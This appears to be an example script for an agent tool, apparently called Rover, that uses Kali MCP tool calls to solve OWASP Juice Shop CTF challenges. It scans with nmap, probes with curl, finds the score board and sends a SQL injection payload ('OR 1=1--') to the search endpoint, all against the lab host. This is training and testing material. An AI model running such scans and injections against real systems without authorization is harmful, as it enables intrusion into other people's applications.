/**
 * OWASP Juice Shop CTF Example for Rover
 * 
 * This example demonstrates how to use Rover to interact with the OWASP Juice Shop CTF environment.
 * It shows both non-interactive and interactive approaches to solving challenges.
 */

// Import required modules
const { promisify } = require('util');
const sleep = promisify(setTimeout);

/**
 * Main function to run the example
 */
async function runExample() {
  console.log('Starting OWASP Juice Shop CTF Example');
  
  try {
    // Step 1: Reconnaissance - Non-interactive command
    console.log('\n=== Step 1: Reconnaissance ===');
    const scanResult = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "execute_command",
      arguments: {
        command: "nmap -sV juice-shop"
      }
    });
    
    console.log('Scan Results:');
    console.log(scanResult);
    
    // Step 2: Create an interactive session
    console.log('\n=== Step 2: Creating Interactive Session ===');
    const sessionResponse = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "create_session",
      arguments: {
        name: "juice-shop-session",
        workingDir: "/ctf"
      }
    });
    
    console.log('Session Created:');
    console.log(sessionResponse);
    
    // Extract the session ID
    const sessionIdMatch = sessionResponse.match(/Session created with ID: ([a-f0-9-]+)/);
    if (!sessionIdMatch) {
      throw new Error('Failed to extract session ID');
    }
    
    const sessionId = sessionIdMatch[1];
    console.log(`Extracted Session ID: ${sessionId}`);
    
    // Step 3: Basic web request to check if the application is running
    console.log('\n=== Step 3: Basic Web Request ===');
    await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "send_input",
      arguments: {
        sessionId: sessionId,
        input: "curl -s -I http://juice-shop:3000"
      }
    });
    
    // Get the output
    const curlOutput = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "get_output",
      arguments: {
        sessionId: sessionId,
        wait: true,
        timeout: 5000
      }
    });
    
    console.log('HTTP Headers:');
    console.log(curlOutput);
    
    // Step 4: Find the Score Board (a common first challenge)
    console.log('\n=== Step 4: Finding the Score Board ===');
    await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "send_input",
      arguments: {
        sessionId: sessionId,
        input: "curl -s http://juice-shop:3000 | grep -i score"
      }
    });
    
    // Get the output
    const grepOutput = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "get_output",
      arguments: {
        sessionId: sessionId,
        wait: true,
        timeout: 5000
      }
    });
    
    console.log('Grep Results:');
    console.log(grepOutput);
    
    // Step 5: Access the Score Board directly
    console.log('\n=== Step 5: Accessing the Score Board ===');
    await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "send_input",
      arguments: {
        sessionId: sessionId,
        input: "curl -s http://juice-shop:3000/score-board"
      }
    });
    
    // Get the output (truncated for brevity)
    const scoreBoardOutput = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "get_output",
      arguments: {
        sessionId: sessionId,
        wait: true,
        timeout: 5000
      }
    });
    
    console.log('Score Board (truncated):');
    console.log(scoreBoardOutput.substring(0, 500) + '...');
    
    // Step 6: Look for SQL Injection vulnerabilities
    console.log('\n=== Step 6: Testing for SQL Injection ===');
    await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "send_input",
      arguments: {
        sessionId: sessionId,
        input: "curl -s 'http://juice-shop:3000/rest/products/search?q=apple%27%20OR%201=1--'"
      }
    });
    
    // Get the output
    const sqlInjectionOutput = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "get_output",
      arguments: {
        sessionId: sessionId,
        wait: true,
        timeout: 5000
      }
    });
    
    console.log('SQL Injection Results (truncated):');
    console.log(sqlInjectionOutput.substring(0, 500) + '...');
    
    // Step 7: Terminate the session
    console.log('\n=== Step 7: Terminating Session ===');
    const terminateResponse = await use_mcp_tool({
      server_name: "kali-ctf",
      tool_name: "terminate_session",
      arguments: {
        sessionId: sessionId
      }
    });
    
    console.log('Session Terminated:');
    console.log(terminateResponse);
    
    console.log('\nExample completed successfully!');
    
  } catch (error) {
    console.error('Error running example:', error);
  }
}

// Run the example
runExample().catch(console.error);
